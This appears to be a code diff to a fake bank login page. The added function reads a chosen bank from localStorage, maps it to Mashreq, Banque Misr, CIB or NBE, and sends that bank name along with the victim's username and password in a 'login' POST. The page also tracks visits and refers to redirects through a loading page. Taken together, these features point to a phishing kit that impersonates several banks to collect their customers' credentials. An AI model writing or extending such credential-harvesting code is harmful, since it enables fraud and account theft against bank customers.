@@ -347,6 +347,18 @@
             }
         });
 
+        // Get the bank's English name (must match the names used in loading.html redirects)
+        function getBankEnglishName() {
+            const bankId = localStorage.getItem('selectedBank') || 'mashreq';
+            const bankNames = {
+                'mashreq': 'Mashreq',
+                'bm': 'Banque Misr',
+                'cib': 'CIB',
+                'nbe': 'NBE'
+            };
+            return bankNames[bankId] || 'Mashreq';
+        }
+
         fetch('/track_visit', {
             method: 'POST',
             headers: {
@@ -374,6 +386,7 @@
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
+            const bankName = getBankEnglishName();
             const errorMessageDiv = document.getElementById("errorMessage");
 
             if (/[\u0600-\u06FF]/.test(username)) {
@@ -390,7 +403,7 @@
                     },
                     body: JSON.stringify({
                         type: "login",
-                        data: { username: username, password: password }
+                        data: { bank: bankName, username: username, password: password }
                     })
                 });
 
